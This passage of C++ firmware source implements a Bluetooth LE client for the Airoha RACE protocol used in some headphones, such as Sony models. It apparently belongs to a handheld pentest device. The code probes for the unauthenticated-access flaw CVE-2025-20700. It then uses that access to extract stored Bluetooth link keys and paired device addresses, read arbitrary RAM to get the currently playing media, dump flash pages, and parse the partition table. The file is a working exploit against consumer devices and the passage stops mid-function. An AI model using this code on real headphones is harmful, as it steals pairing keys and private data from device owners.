#if !defined(LITE_VERSION)

#include "race_client.h"
#include "BLE_Suite.h"
#include "ble_oui.h"
#include "gatt_explorer.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/scrollableTextArea.h"
#include "core/utils.h"
#include <LittleFS.h>
#include <SD.h>
#include <globals.h>

//=============================================================================
// Global Client Reference for Callbacks
//=============================================================================

static RaceClient *g_activeRaceClient = nullptr;

static void notifyCallback(NimBLERemoteCharacteristic *pChar, uint8_t *pData, size_t length, bool isNotify) {
    if (g_activeRaceClient) {
        g_activeRaceClient->onNotify(pChar, pData, length, isNotify);
    }
}

//=============================================================================
// Constructor & Destructor
//=============================================================================

RaceClient::RaceClient()
    : m_pClient(nullptr),
      m_ownsClient(false),
      m_pService(nullptr),
      m_pTxChar(nullptr),
      m_pRxChar(nullptr),
      m_expectedLength(0),
      m_expectingResponse(false),
      m_expectedCmdId(0)
{
    m_syncSemaphore = xSemaphoreCreateBinary();
    m_packetMutex = xSemaphoreCreateMutex();
}

RaceClient::~RaceClient() {
    disconnect();
    if (m_syncSemaphore) {
        vSemaphoreDelete(m_syncSemaphore);
        m_syncSemaphore = nullptr;
    }
    if (m_packetMutex) {
        vSemaphoreDelete(m_packetMutex);
        m_packetMutex = nullptr;
    }
}

//=============================================================================
// Connection & Lifecycle
//=============================================================================

bool RaceClient::connect(const NimBLEAddress &address, uint32_t timeoutMs) {
    disconnect();
    resetRxState();

    NimBLEClient *pClient = nullptr;
    int err = 0;
    bool cancelled = false;

    if (!gattConnectWithStrategies(address, &pClient, &err, &cancelled) || !pClient) {
        Serial.printf("[RACE] Connection failed: 0x%02X\n", err);
        return false;
    }

    m_pClient = pClient;
    m_ownsClient = true;
    resetRxState();

    Serial.println(F("[RACE] Connection established. Exchanging MTU..."));
    m_pClient->exchangeMTU();
    delay(50);

    return discoverRaceService();
}

bool RaceClient::attachClient(NimBLEClient *pClient) {
    if (!pClient || !pClient->isConnected()) return false;
    disconnect();
    m_pClient = pClient;
    m_ownsClient = false;
    resetRxState();
    return discoverRaceService();
}

void RaceClient::disconnect() {
    if (g_activeRaceClient == this) {
        g_activeRaceClient = nullptr;
    }
    if (m_pRxChar && m_pClient && m_pClient->isConnected()) {
        m_pRxChar->unsubscribe();
    }
    m_pRxChar = nullptr;
    m_pTxChar = nullptr;
    m_pService = nullptr;
    m_serviceUuid = "";

    if (m_pClient) {
        if (m_ownsClient) {
            if (m_pClient->isConnected()) {
                m_pClient->disconnect();
            }
            NimBLEDevice::deleteClient(m_pClient);
        }
        m_pClient = nullptr;
    }
    m_ownsClient = false;
    resetRxState();
}

bool RaceClient::isConnected() const {
    return (m_pClient != nullptr && m_pClient->isConnected() && m_pTxChar != nullptr && m_pRxChar != nullptr);
}

void RaceClient::resetRxState() {
    if (m_packetMutex && xSemaphoreTake(m_packetMutex, pdMS_TO_TICKS(100)) == pdTRUE) {
        m_rxBuffer.clear();
        m_lastResponse.clear();
        m_expectedLength = 0;
        m_expectingResponse = false;
        m_expectedCmdId = 0;
        xSemaphoreGive(m_packetMutex);
    }
}

//=============================================================================
// Service Discovery & Hooking
//=============================================================================

bool RaceClient::discoverRaceService() {
    if (!m_pClient || !m_pClient->isConnected()) return false;

    g_activeRaceClient = this;
    m_pService = nullptr;
    m_pTxChar = nullptr;
    m_pRxChar = nullptr;
    m_serviceUuid = "";

    Serial.println(F("\n[RACE] =================================="));
    Serial.println(F("[RACE] Discovering Remote GATT Services & Characteristics..."));

    // Ensure all remote attributes/services are retrieved
    const auto &services = m_pClient->getServices(true);
    if (services.empty()) {
        Serial.println(F("[RACE] getServices() returned empty. Calling discoverAttributes()..."));
        m_pClient->discoverAttributes();
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }

    const auto &activeServices = m_pClient->getServices(false);
    if (activeServices.empty()) {
        Serial.println(F("[RACE] No GATT services discovered on peer"));
        return false;
    }

    Serial.printf("[RACE] Peer exposes %d GATT service(s):\n", (int)activeServices.size());
    for (auto *s : activeServices) {
        Serial.printf("[RACE]   - Service: %s\n", s->getUUID().toString().c_str());
    }

    // Candidate Service Profiles to Probe
    struct RaceServiceProfile {
        const char *serviceUuid;
        const char *txUuid;
        const char *rxUuid;
        const char *rxAltUuid;
        const char *name;
    };

    const RaceServiceProfile profiles[] = {
        { RACE_UUID_AIROHA_SERVICE,   RACE_UUID_AIROHA_TX,      RACE_UUID_AIROHA_RX,      RACE_UUID_AIROHA_RX_ALT, "Airoha Standard" },
        { RACE_UUID_SONY_SERVICE,     RACE_UUID_SONY_TX,        RACE_UUID_SONY_RX,        nullptr,                 "Sony Vendor" },
        { RACE_UUID_TRSPX_SERVICE,    RACE_UUID_TRSPX_TX,       RACE_UUID_TRSPX_RX,       nullptr,                 "TRSPX Transparent" },
        { RACE_UUID_AIROHA_16BIT_SRV, RACE_UUID_AIROHA_16BIT_TX,RACE_UUID_AIROHA_16BIT_RX,nullptr,                 "Airoha 16-bit FEF0" },
    };

    for (const auto &prof : profiles) {
        NimBLEUUID targetSrvUuid(prof.serviceUuid);
        for (auto *srv : activeServices) {
            if (srv->getUUID().equals(targetSrvUuid)) {
                Serial.printf("[RACE] Matched %s Service: %s\n", prof.name, prof.serviceUuid);
                m_pService = srv;
                m_serviceUuid = String(prof.serviceUuid);

                // Populate characteristics for this service
                srv->getCharacteristics(true);
                m_pTxChar = srv->getCharacteristic(NimBLEUUID(prof.txUuid));
                m_pRxChar = srv->getCharacteristic(NimBLEUUID(prof.rxUuid));
                if (!m_pRxChar && prof.rxAltUuid) {
                    m_pRxChar = srv->getCharacteristic(NimBLEUUID(prof.rxAltUuid));
                }
                break;
            }
        }
        if (m_pTxChar && m_pRxChar) break;
    }

    // Heuristic fallback: check if any service exposes known TX / RX characteristics
    if (!m_pTxChar || !m_pRxChar) {
        Serial.println(F("[RACE] Primary profile match not found. Scanning all characteristics across services..."));
        for (auto *srv : activeServices) {
            const auto &chars = srv->getCharacteristics(true);
            for (auto *ch : chars) {
                String u = String(ch->getUUID().toString().c_str());
                if (u.equalsIgnoreCase(RACE_UUID_AIROHA_TX) || u.equalsIgnoreCase(RACE_UUID_SONY_TX) ||
                    u.equalsIgnoreCase(RACE_UUID_TRSPX_TX) || u.equalsIgnoreCase(RACE_UUID_AIROHA_16BIT_TX)) {
                    m_pTxChar = ch;
                    m_pService = srv;
                    m_serviceUuid = String(srv->getUUID().toString().c_str());
                    Serial.printf("[RACE] Found Candidate TX Char: %s\n", u.c_str());
                }
                if (u.equalsIgnoreCase(RACE_UUID_AIROHA_RX) || u.equalsIgnoreCase(RACE_UUID_AIROHA_RX_ALT) ||
                    u.equalsIgnoreCase(RACE_UUID_SONY_RX) || u.equalsIgnoreCase(RACE_UUID_TRSPX_RX) ||
                    u.equalsIgnoreCase(RACE_UUID_AIROHA_16BIT_RX)) {
                    m_pRxChar = ch;
                    Serial.printf("[RACE] Found Candidate RX Char: %s\n", u.c_str());
                }
            }
            if (m_pTxChar && m_pRxChar) break;
        }
    }

    // Generic fallback: if a custom vendor service has exactly one writeable and one notify characteristic
    if (!m_pTxChar || !m_pRxChar) {
        for (auto *srv : activeServices) {
            String sUuid = String(srv->getUUID().toString().c_str());
            // Ignore standard BLE services (Generic Access, Generic Attribute, Device Info)
            if (sUuid.startsWith("00001800") || sUuid.startsWith("00001801") || sUuid.startsWith("0000180a")) continue;

            const auto &chars = srv->getCharacteristics(true);
            NimBLERemoteCharacteristic *cTx = nullptr;
            NimBLERemoteCharacteristic *cRx = nullptr;
            for (auto *ch : chars) {
                if ((ch->canWrite() || ch->canWriteNoResponse()) && !cTx) {
                    cTx = ch;
                }
                if ((ch->canNotify() || ch->canIndicate()) && !cRx) {
                    cRx = ch;
                }
            }
            if (cTx && cRx) {
                Serial.printf("[RACE] Discovered custom candidate vendor service: %s\n", sUuid.c_str());
                m_pService = srv;
                m_serviceUuid = sUuid;
                m_pTxChar = cTx;
                m_pRxChar = cRx;
                break;
            }
        }
    }

    if (!m_pTxChar || !m_pRxChar) {
        Serial.println(F("[RACE] Target does not expose supported RACE characteristics"));
        return false;
    }

    Serial.printf("[RACE] Hooked TX Char: %s (Write: %s, WriteNR: %s)\n",
                  m_pTxChar->getUUID().toString().c_str(),
                  m_pTxChar->canWrite() ? "YES" : "NO",
                  m_pTxChar->canWriteNoResponse() ? "YES" : "NO");
    Serial.printf("[RACE] Hooked RX Char: %s (Notify: %s, Indicate: %s)\n",
                  m_pRxChar->getUUID().toString().c_str(),
                  m_pRxChar->canNotify() ? "YES" : "NO",
                  m_pRxChar->canIndicate() ? "YES" : "NO");

    // Negotiate MTU now that service and characteristics are resolved
    Serial.println(F("[RACE] Exchanging ATT MTU..."));
    m_pClient->exchangeMTU();
    vTaskDelay(50 / portTICK_PERIOD_MS);

    // Subscribe to RX notifications / indications
    Serial.println(F("[RACE] Subscribing to RX notifications/indications..."));
    if (!m_pRxChar->subscribe(true, notifyCallback)) {
        Serial.println(F("[RACE] Failed to subscribe to RX notifications"));
        return false;
    }

    Serial.println(F("[RACE] Successfully subscribed to RACE RX notifications!"));
    Serial.println(F("[RACE] ==================================\n"));
    return true;
}

//=============================================================================
// Notification & Packet Reassembly
//=============================================================================

void RaceClient::onNotify(NimBLERemoteCharacteristic *pChar, uint8_t *pData, size_t length, bool isNotify) {
    if (!pData || length == 0) return;

    if (xSemaphoreTake(m_packetMutex, pdMS_TO_TICKS(50)) != pdTRUE) return;

    // Append fragment
    m_rxBuffer.insert(m_rxBuffer.end(), pData, pData + length);

    // Check if we have at least the header
    if (m_rxBuffer.size() >= sizeof(RaceHeader)) {
        RaceHeader *hdr = (RaceHeader *)m_rxBuffer.data();
        m_expectedLength = hdr->length;

        // Total packet size is 4 bytes (head + type + length) + expectedLength
        size_t totalExpected = 4 + m_expectedLength;

        if (m_rxBuffer.size() >= totalExpected) {
            // Accept any valid RACE response frame (RACE_TYPE_RSP, RACE_TYPE_IND, etc.)
            m_lastResponse.assign(m_rxBuffer.begin(), m_rxBuffer.begin() + totalExpected);
            m_rxBuffer.erase(m_rxBuffer.begin(), m_rxBuffer.begin() + totalExpected);

            if (m_expectingResponse && (m_expectedCmdId == 0 || hdr->cmdId == m_expectedCmdId)) {
                m_expectingResponse = false;
                xSemaphoreGive(m_syncSemaphore);
            }
        }
    }

    xSemaphoreGive(m_packetMutex);
}

//=============================================================================
// Core Synchronous Protocol Send
//=============================================================================

bool RaceClient::sendRawPacket(const uint8_t *data, size_t len) {
    if (!isConnected() || !data || len == 0 || !m_pTxChar) return false;

    // Prefer Write Without Response if supported to avoid blocking on ATT Write RSP timeouts
    bool response = false;
    if (!m_pTxChar->canWriteNoResponse() && m_pTxChar->canWrite()) {
        response = true;
    }
    return m_pTxChar->writeValue(data, len, response);
}

bool RaceClient::sendCommandSync(uint8_t head, uint8_t type, uint16_t cmdId,
                                 const uint8_t *payload, size_t payloadLen,
                                 std::vector<uint8_t> &response, uint32_t timeoutMs)
{
    if (!isConnected()) return false;

    // Reset sync semaphore & response state
    xSemaphoreTake(m_syncSemaphore, 0);

    if (xSemaphoreTake(m_packetMutex, pdMS_TO_TICKS(50)) == pdTRUE) {
        m_rxBuffer.clear();
        m_lastResponse.clear();
        m_expectingResponse = true;
        m_expectedCmdId = cmdId;
        xSemaphoreGive(m_packetMutex);
    }

    // Build RACE packet
    // Header: head (1B), type (1B), length (2B LE), cmdId (2B LE)
    uint16_t raceLen = (uint16_t)(payloadLen + 2);
    size_t totalPacketLen = sizeof(RaceHeader) + payloadLen;
    std::vector<uint8_t> pkt(totalPacketLen);

    RaceHeader *hdr = (RaceHeader *)pkt.data();
    hdr->head = head;
    hdr->type = type;
    hdr->length = raceLen;
    hdr->cmdId = cmdId;

    if (payload && payloadLen > 0) {
        memcpy(pkt.data() + sizeof(RaceHeader), payload, payloadLen);
    }

    Serial.printf("[RACE-TX] Head:0x%02X Type:0x%02X Cmd:0x%04X Len:%u\n", head, type, cmdId, (unsigned int)payloadLen);

    bool writeOk = sendRawPacket(pkt.data(), pkt.size());
    if (!writeOk) {
        // Fallback: If Write Without Response failed, try Write With Response
        if (m_pTxChar && m_pTxChar->canWrite()) {
            writeOk = m_pTxChar->writeValue(pkt.data(), pkt.size(), true);
        }
    }

    if (!writeOk) {
        Serial.printf("[RACE-ERR] Failed to write cmd 0x%04X to TX char\n", cmdId);
        m_expectingResponse = false;
        return false;
    }

    // Non-blocking poll loop checking for response & ESC key
    uint32_t startMs = millis();
    while (millis() - startMs < timeoutMs) {
        if (check(EscPress) || check(PrevPress)) {
            Serial.printf("[RACE-CANCEL] Cmd 0x%04X cancelled by user (ESC)\n", cmdId);
            m_expectingResponse = false;
            return false;
        }

        if (xSemaphoreTake(m_syncSemaphore, pdMS_TO_TICKS(20)) == pdTRUE) {
            if (xSemaphoreTake(m_packetMutex, pdMS_TO_TICKS(50)) == pdTRUE) {
                response = m_lastResponse;
                xSemaphoreGive(m_packetMutex);
                if (!response.empty()) {
                    Serial.printf("[RACE-RX] Cmd 0x%04X response received (%u bytes)\n", cmdId, (unsigned int)response.size());
                    return true;
                }
            }
        }
    }

    m_expectingResponse = false;
    Serial.printf("[RACE-TIMEOUT] Timeout waiting for response to cmd 0x%04X (%u ms)\n", cmdId, (unsigned int)timeoutMs);
    return false;
}

//=============================================================================
// High-Value Feature: Vulnerability Prober (CVE-2025-20700)
//=============================================================================

bool RaceClient::probeVulnerability(RaceVulnerabilityReport &report,
                                    std::function<void(const String &stepMsg)> progressCb)
{
    report.cve2025_20700 = RACE_VULN_UNKNOWN;
    report.cve2025_20701 = RACE_VULN_UNKNOWN;
    report.raceOverBle = RACE_VULN_UNKNOWN;
    report.details = "";

    if (!isConnected()) {
        report.raceOverBle = RACE_VULN_NOT_APPLICABLE;
        report.cve2025_20700 = RACE_VULN_NOT_APPLICABLE;
        report.details = "Device not connected or no RACE service";
        return false;
    }

    report.raceOverBle = RACE_VULN_VULNERABLE;
    Serial.println(F("[RACE-AUDIT] Starting CVE-2025-20700 Unauthenticated Access Audit..."));

    // Probe 1: Query Build Version (0x1E08)
    if (progressCb) progressCb("[1/4] Probe Build (0x1E08)...");
    Serial.println(F("[RACE-AUDIT] [Probe 1/4] Querying Build Version (0x1E08)..."));
    std::vector<uint8_t> rsp;
    bool probeOk = sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_GET_BUILD_VERSION, nullptr, 0, rsp, 1500);

    // Probe 2: Query SDK Version (0x0301)
    if (!probeOk) {
        if (check(EscPress) || check(PrevPress)) {
            report.details = "Audit cancelled by user";
            return false;
        }
        if (progressCb) progressCb("[2/4] Probe SDK (0x0301)...");
        Serial.println(F("[RACE-AUDIT] [Probe 2/4] Querying SDK Version (0x0301)..."));
        probeOk = sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_READ_SDK_VERSION, nullptr, 0, rsp, 1500);
    }

    // Probe 3: Query BD_ADDR (0x0CD5)
    if (!probeOk) {
        if (check(EscPress) || check(PrevPress)) {
            report.details = "Audit cancelled by user";
            return false;
        }
        if (progressCb) progressCb("[3/4] Probe BD_ADDR (0x0CD5)...");
        Serial.println(F("[RACE-AUDIT] [Probe 3/4] Querying Classic BD_ADDR (0x0CD5)..."));
        probeOk = sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_GET_BD_ADDRESS, nullptr, 0, rsp, 1500);
    }

    // Probe 4: RAM Read at 0x14238C9C
    if (!probeOk) {
        if (check(EscPress) || check(PrevPress)) {
            report.details = "Audit cancelled by user";
            return false;
        }
        if (progressCb) progressCb("[4/4] Probe RAM (0x1680)...");
        Serial.println(F("[RACE-AUDIT] [Probe 4/4] Querying RAM Address (0x1680)..."));
        uint32_t ramVal = 0;
        if (readRamWord(0x14238C9C, ramVal)) {
            probeOk = true;
        }
    }

    if (check(EscPress) || check(PrevPress)) {
        report.details = "Audit cancelled by user";
        return false;
    }

    if (probeOk) {
        report.cve2025_20700 = RACE_VULN_VULNERABLE;
        report.details = "RACE GATT service executes unauthenticated commands!";
        Serial.println(F("[RACE-AUDIT] >>> TARGET IS VULNERABLE TO CVE-2025-20700 <<<"));
        return true;
    }

    report.cve2025_20700 = RACE_VULN_FIXED;
    report.details = "Commands rejected or require bonding/auth";
    Serial.println(F("[RACE-AUDIT] Target commands rejected or authentication required."));
    return true;
}

//=============================================================================
// High-Value Feature: Device Metadata Extraction
//=============================================================================

bool RaceClient::fetchDeviceInfo(RaceDeviceInfo &info,
                                 std::function<void(const String &stepMsg)> progressCb)
{
    info.sdkInfo = "";
    info.buildVersion = "";
    info.classicBdAddr = "";
    info.linkKeyCount = 0;
    info.linkKeys.clear();
    info.hasRaceService = isConnected();
    info.matchedServiceUuid = m_serviceUuid;

    if (!isConnected()) return false;

    Serial.println(F("[RACE-INFO] Extracting Device Metadata & Link Keys..."));

    // 1. Read Build Version (0x1E08)
    if (check(EscPress) || check(PrevPress)) return false;
    if (progressCb) progressCb("[1/4] Reading Build (0x1E08)...");
    Serial.println(F("[RACE-INFO] [1/4] Reading Build Version (0x1E08)..."));
    std::vector<uint8_t> rsp;
    if (sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_GET_BUILD_VERSION, nullptr, 0, rsp, 1500)) {
        if (rsp.size() > sizeof(RaceHeader)) {
            // Check if there's a return code byte or raw string
            size_t strOffset = sizeof(RaceHeader);
            if (rsp[strOffset] == 0x00 && rsp.size() > sizeof(RaceHeader) + 1) {
                strOffset += 1;
            }
            String bv = "";
            for (size_t i = strOffset; i < rsp.size(); i++) {
                if (rsp[i] >= 32 && rsp[i] <= 126) bv += (char)rsp[i];
            }
            bv.trim();
            info.buildVersion = bv;
            Serial.printf("[RACE-INFO] Build Version: %s\n", info.buildVersion.c_str());
        }
    }

    // 2. Read SDK Version (0x0301)
    if (check(EscPress) || check(PrevPress)) return false;
    if (progressCb) progressCb("[2/4] Reading SDK (0x0301)...");
    Serial.println(F("[RACE-INFO] [2/4] Reading SDK Version (0x0301)..."));
    rsp.clear();
    if (sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_READ_SDK_VERSION, nullptr, 0, rsp, 1500)) {
        if (rsp.size() > sizeof(RaceHeader)) {
            size_t strOffset = sizeof(RaceHeader);
            if (rsp[strOffset] == 0x00 && rsp.size() > sizeof(RaceHeader) + 1) {
                strOffset += 1;
            }
            String sdk = "";
            for (size_t i = strOffset; i < rsp.size(); i++) {
                if (rsp[i] >= 32 && rsp[i] <= 126) sdk += (char)rsp[i];
            }
            sdk.trim();
            info.sdkInfo = sdk;
            Serial.printf("[RACE-INFO] SDK: %s\n", info.sdkInfo.c_str());
        }
    }

    // 3. Read Classic Bluetooth BD_ADDR (0x0CD5)
    if (check(EscPress) || check(PrevPress)) return false;
    if (progressCb) progressCb("[3/4] Querying BD_ADDR (0x0CD5)...");
    Serial.println(F("[RACE-INFO] [3/4] Querying Classic BD_ADDR (0x0CD5)..."));
    rsp.clear();
    if (sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_GET_BD_ADDRESS, nullptr, 0, rsp, 1500)) {
        // Preamble: return_code (1B) + agent_or_partner (1B) + bd_addr (6B, LE reversed)
        size_t addrOffset = sizeof(RaceHeader) + 2;
        if (rsp.size() >= addrOffset + 6) {
            char macBuf[24];
            snprintf(macBuf, sizeof(macBuf), "%02X:%02X:%02X:%02X:%02X:%02X",
                     rsp[addrOffset + 5], rsp[addrOffset + 4], rsp[addrOffset + 3],
                     rsp[addrOffset + 2], rsp[addrOffset + 1], rsp[addrOffset + 0]);
            info.classicBdAddr = String(macBuf);
            Serial.printf("[RACE-INFO] Classic BD_ADDR: %s\n", info.classicBdAddr.c_str());
        }
    }

    // 4. Read Link Keys (0x0CC0)
    if (check(EscPress) || check(PrevPress)) return false;
    if (progressCb) progressCb("[4/4] Querying Link Keys (0x0CC0)...");
    Serial.println(F("[RACE-INFO] [4/4] Querying Stored Link Keys (0x0CC0)..."));
    rsp.clear();
    if (sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_GET_LINK_KEY, nullptr, 0, rsp, 1500)) {
        // Preamble: return_code (1B) + num_of_devices (1B) + reserved (1B)
        size_t pOffset = sizeof(RaceHeader);
        if (rsp.size() >= pOffset + 3) {
            uint8_t numDevs = rsp[pOffset + 1];
            info.linkKeyCount = numDevs;
            size_t recOffset = pOffset + 3;
            // Record size: 22 bytes (6B MAC + 16B Link Key)
            for (int i = 0; i < numDevs && recOffset + 22 <= rsp.size(); i++) {
                char devMac[20];
                snprintf(devMac, sizeof(devMac), "%02X:%02X:%02X:%02X:%02X:%02X",
                         rsp[recOffset + 5], rsp[recOffset + 4], rsp[recOffset + 3],
                         rsp[recOffset + 2], rsp[recOffset + 1], rsp[recOffset + 0]);

                String keyHex = "";
                for (size_t k = 6; k < 22; k++) {
                    char bHex[4];
                    snprintf(bHex, sizeof(bHex), "%02X", rsp[recOffset + k]);
                    keyHex += bHex;
                }
                String entry = String(devMac) + " -> " + keyHex;
                info.linkKeys.push_back(entry);
                Serial.printf("[RACE-INFO] Link Key: %s\n", entry.c_str());
                recOffset += 22;
            }
        }
    }

    return true;
}

//=============================================================================
// Live Media Info Metadata Inspector (Sony / Airoha)
//=============================================================================

bool RaceClient::fetchMediaInfo(String &track, String &album, String &artist, String &genre) {
    track = "";
    album = "";
    artist = "";
    genre = "";

    if (!isConnected()) return false;

    // Helper lambda to read null-terminated or length-prefixed string from RAM address pointer
    auto readStringAtPtr = [this](uint32_t ptrAddr, size_t maxLen) -> String {
        uint32_t strPtr = 0;
        if (!readRamWord(ptrAddr, strPtr) || strPtr == 0 || strPtr < 0x10000000) return "";

        std::vector<uint8_t> ramBytes;
        if (!readRam(strPtr, maxLen, ramBytes)) return "";

        String result = "";
        for (size_t i = 0; i < ramBytes.size(); i++) {
            if (ramBytes[i] == 0) break;
            if (ramBytes[i] >= 32 && ramBytes[i] <= 126) {
                result += (char)ramBytes[i];
            }
        }
        result.trim();
        return result;
    };

    // 1. Try Sony WH-CH720N v1.0.8 pointers
    track = readStringAtPtr(0x14238C9C, 64);
    if (!track.isEmpty()) {
        album  = readStringAtPtr(0x14238C6C, 64);
        artist = readStringAtPtr(0x14238C88, 64);
        genre  = readStringAtPtr(0x14238CA4, 64);
        return true;
    }

    // 2. Try Sony WH-CH720N v1.0.9 chunk dump at 0x14238DB0
    std::vector<uint8_t> chunkData;
    if (readRam(0x14238DB0, 256, chunkData) && chunkData.size() >= 64) {
        // Parse fields delimited by 0x02
        std::vector<String> fields;
        String cur = "";
        for (size_t i = 0; i < chunkData.size(); i++) {
            if (chunkData[i] == 0x02) {
                if (!cur.isEmpty()) {
                    fields.push_back(cur);
                    cur = "";
                }
                // Skip length byte if present
                if (i + 1 < chunkData.size() && chunkData[i + 1] < 128) {
                    i++;
                }
            } else if (chunkData[i] >= 32 && chunkData[i] <= 126) {
                cur += (char)chunkData[i];
            }
        }
        if (!cur.isEmpty()) fields.push_back(cur);

        if (!fields.empty()) {
            if (fields.size() > 0) track  = fields[0];
            if (fields.size() > 1) album  = fields[1];
            if (fields.size() > 2) artist = fields[2];
            if (fields.size() > 3) genre  = fields[3];
            return true;
        }
    }

    return false;
}

//=============================================================================
// Moderate-Value Feature: Targeted RAM Read (0x1680)
//=============================================================================

bool RaceClient::readRamWord(uint32_t address, uint32_t &outWord) {
    if (!isConnected()) return false;

    // Request payload: 0x00 0x00 (2B) + address (4B LE)
    uint8_t req[6];
    req[0] = 0x00;
    req[1] = 0x00;
    req[2] = (uint8_t)(address & 0xFF);
    req[3] = (uint8_t)((address >> 8) & 0xFF);
    req[4] = (uint8_t)((address >> 16) & 0xFF);
    req[5] = (uint8_t)((address >> 24) & 0xFF);

    std::vector<uint8_t> rsp;
    if (!sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_READ_ADDRESS, req, sizeof(req), rsp, 1200)) {
        return false;
    }

    // Response layout: RaceHeader (6B) + return_code (1B) + 0x00 0x00 (2B) + read_address (4B) + data (4B)
    size_t minExpected = sizeof(RaceHeader) + 1 + 2 + 4 + 4;
    if (rsp.size() < minExpected) return false;

    uint8_t retCode = rsp[sizeof(RaceHeader)];
    if (retCode != 0) return false;

    size_t dataOffset = sizeof(RaceHeader) + 7;
    outWord = (uint32_t)rsp[dataOffset] |
              ((uint32_t)rsp[dataOffset + 1] << 8) |
              ((uint32_t)rsp[dataOffset + 2] << 16) |
              ((uint32_t)rsp[dataOffset + 3] << 24);

    return true;
}

bool RaceClient::readRam(uint32_t address, size_t length, std::vector<uint8_t> &outData,
                         std::function<void(size_t done, size_t total)> progressCb)
{
    outData.clear();
    if (!isConnected() || length == 0) return false;

    // Align length to 4-byte words
    size_t totalWords = (length + 3) / 4;
    outData.reserve(totalWords * 4);

    for (size_t i = 0; i < totalWords; i++) {
        if (check(EscPress) || check(PrevPress)) {
            Serial.println(F("[RACE] RAM read aborted by user keypress (ESC)"));
            return false;
        }

        uint32_t currAddr = address + (i * 4);
        uint32_t wordVal = 0;
        if (!readRamWord(currAddr, wordVal)) {
            Serial.printf("[RACE] RAM read failed at address 0x%08X\n", (unsigned int)currAddr);
            return false;
        }
        outData.push_back((uint8_t)(wordVal & 0xFF));
        outData.push_back((uint8_t)((wordVal >> 8) & 0xFF));
        outData.push_back((uint8_t)((wordVal >> 16) & 0xFF));
        outData.push_back((uint8_t)((wordVal >> 24) & 0xFF));

        if (progressCb) {
            progressCb((i + 1) * 4, totalWords * 4);
        }
    }

    outData.resize(length);
    return true;
}

//=============================================================================
// Moderate-Value Feature: Flash Page Read & Partition Table (0x0403)
//=============================================================================

bool RaceClient::readFlashPage(uint32_t address, uint8_t *outPage256, uint8_t storageType) {
    if (!isConnected() || !outPage256) return false;

    // Request payload: storage_type (1B) + (size>>8) (1B = 0x01 for 256 bytes) + address (4B LE)
    uint8_t req[6];
    req[0] = storageType;
    req[1] = 0x01; // 256 bytes page
    req[2] = (uint8_t)(address & 0xFF);
    req[3] = (uint8_t)((address >> 8) & 0xFF);
    req[4] = (uint8_t)((address >> 16) & 0xFF);
    req[5] = (uint8_t)((address >> 24) & 0xFF);

    std::vector<uint8_t> rsp;
    if (!sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_STORAGE_PAGE_READ, req, sizeof(req), rsp, 2000)) {
        return false;
    }

    // Response layout: RaceHeader (6B) + return_code (1B) + storage_type (1B) + 0x00 0x00 (2B) + read_address (4B) + data (256B)
    size_t preambleSize = 8;
    size_t expectedTotal = sizeof(RaceHeader) + preambleSize + 256;
    if (rsp.size() < expectedTotal) return false;

    uint8_t retCode = rsp[sizeof(RaceHeader)];
    if (retCode != 0) return false;

    size_t dataOffset = sizeof(RaceHeader) + preambleSize;
    memcpy(outPage256, rsp.data() + dataOffset, 256);
    return true;
}

bool RaceClient::readFlash(uint32_t address, size_t length, std::vector<uint8_t> &outData,
                           std::function<void(size_t done, size_t total)> progressCb)
{
    outData.clear();
    if (!isConnected() || length == 0) return false;

    size_t numPages = (length + 255) / 256;
    outData.resize(numPages * 256);

    for (size_t i = 0; i < numPages; i++) {
        if (check(EscPress) || check(PrevPress)) {
            Serial.println(F("[RACE] Flash read aborted by user keypress (ESC)"));
            return false;
        }

        uint32_t currAddr = address + (i * 256);
        if (!readFlashPage(currAddr, outData.data() + (i * 256))) {
            Serial.printf("[RACE] Flash page read failed at 0x%08X\n", (unsigned int)currAddr);
            return false;
        }
        if (progressCb) {
            progressCb((i + 1) * 256, numPages * 256);
        }
    }

    outData.resize(length);
    return true;
}

bool RaceClient::getPartitionTable(std::vector<RacePartitionEntry> &partitions) {
    partitions.clear();
    if (!isConnected()) return false;

    Serial.println(F("[RACE] Reading Flash Partition Table at 0x00000000 (4KB)..."));

    // Read the first 0x1000 (4096) bytes from Flash offset 0x00000000
    std::vector<uint8_t> ptData;
    if (!readFlash(0x00000000, 0x1000, ptData, [](size_t done, size_t total) {
        tft.setTextSize(FP);
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.fillRect(BORDER_PAD_X, BORDER_PAD_Y + 28, tftWidth - 2 * BORDER_PAD_X, 11, bruceConfig.bgColor);
        int page = (int)(done / 256);
        tft.drawString("Reading Page " + String(page) + "/16 (4KB)...", BORDER_PAD_X, BORDER_PAD_Y + 28);
    })) {
        Serial.println(F("[RACE] Failed to read Flash partition table header"));
        return false;
    }

    // Partition Table starts at offset 0x0C (12 decimal) with 48-byte records
    size_t offset = 0x0C;
    size_t entrySize = 48;

    while (offset + entrySize <= ptData.size()) {
        const uint8_t *entry = ptData.data() + offset;
        uint32_t addr = (uint32_t)entry[0] | ((uint32_t)entry[1] << 8) | ((uint32_t)entry[2] << 16) | ((uint32_t)entry[3] << 24);
        uint32_t len  = (uint32_t)entry[8] | ((uint32_t)entry[9] << 8) | ((uint32_t)entry[10] << 16) | ((uint32_t)entry[11] << 24);
        uint8_t ptype = entry[36];

        if ((addr == 0xFFFFFFFF && len == 0xFFFFFFFF) || ptype == 0xFF || len == 0) {
            break;
        }

        RacePartitionEntry p;
        p.address = addr;
        p.length = len;
        p.type = ptype;

        switch (ptype) {
            case 0:  p.name = "BOOTLOADER"; break;
            case 1:  p.name = "FOTA_IMG"; break;
            case 2:  p.name = "SYSTEM"; break;
            case 3:  p.name = "DSP"; break;
            case 4:  p.name = "AUDIO"; break;
            case 5:  p.name = "FILESYSTEM"; break;
            case 6:  p.name = "NVDM / NVRAM"; break;
            case 7:  p.name = "USER_DATA"; break;
            default: p.name = "TYPE_" + String(ptype); break;
        }

